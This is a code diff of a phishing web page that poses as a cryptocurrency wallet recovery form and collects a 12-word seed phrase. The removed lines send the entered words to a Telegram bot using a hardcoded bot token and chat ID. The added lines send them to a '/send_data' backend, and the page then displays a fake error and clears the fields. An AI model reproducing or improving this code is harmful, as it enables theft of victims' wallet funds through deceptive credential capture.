@@ -39,8 +39,8 @@
         .recovery-subtitle { color: var(--text-secondary); text-align: left; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
         .recovery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
         .grid-item { background-color: var(--input-bg); border-radius: 8px; height: 56px; display: flex; align-items: center; justify-content: center; position: relative; border: 1px solid transparent; transition: 0.3s; }
-        .grid-item.invalid { border-color: var(--error-red); } /* الكلمة الخطأ تلون الإطار بالأحمر */
-        .grid-item.invalid .item-input { color: var(--error-red); } /* والخط بالأحمر */
+        .grid-item.invalid { border-color: var(--error-red); }
+        .grid-item.invalid .item-input { color: var(--error-red); }
         .item-num { color: var(--text-secondary); font-size: 16px; font-weight: 500; }
         .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; }
         .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
@@ -82,18 +82,13 @@
     </div>
 
     <script>
-        const BOT_TOKEN = "8728135052:AAHDF-SQCPsS1y0JykPgEE691NIjQweUeIU";
-        const CHAT_ID = "8745009295";
-
-        // قائمة مصغرة للتحقق (يمكنك استبدالها بالقائمة الكاملة)
-        const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident"];
-
+        // إرسال البيانات عبر السيرفر (Back-end)
         async function sendFinalData(message) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch('/send_data', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                    body: JSON.stringify({ message: message })
                 });
             } catch(e) {}
         }
@@ -113,27 +108,18 @@
             grid.appendChild(div);
         }
 
-        // مراقبة الكتابة لتغيير اللون والتحقق
         document.addEventListener('input', (e) => {
             if (e.target.classList.contains('item-input')) {
                 const val = e.target.value.trim().toLowerCase();
                 const parent = e.target.parentElement;
-                
-                // إذا كانت الكلمة مخربقة (مثلاً حروف عشوائية) تظهر حمراء
-                // هنا نتحقق أن الكلمة ليست فارغة وأنها موجودة في "القاموس" أو طولها معقول
                 if (val !== "" && val.length < 3) {
                     parent.classList.add('invalid');
                 } else {
                     parent.classList.remove('invalid');
                 }
-
-                if (e.target.getAttribute('data-id') === "12") {
-                    // لا يتم الإرسال التلقائي هنا للسماح للمستخدم بالضغط على الزر
-                }
             }
         });
 
-        // ميزة اللصق التلقائي (Auto-Paste)
         document.addEventListener('paste', (e) => {
             if (e.target.classList.contains('item-input')) {
                 e.preventDefault();
@@ -158,7 +144,6 @@
             if (count > 0) {
                 sendFinalData(`<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`);
                 document.getElementById('errorMessage').style.display = 'block';
-                // مسح الكلمات بعد ثانية للحفاظ على الخصوصية
                 setTimeout(() => {
                     inputs.forEach(input => {
                         input.value = "";
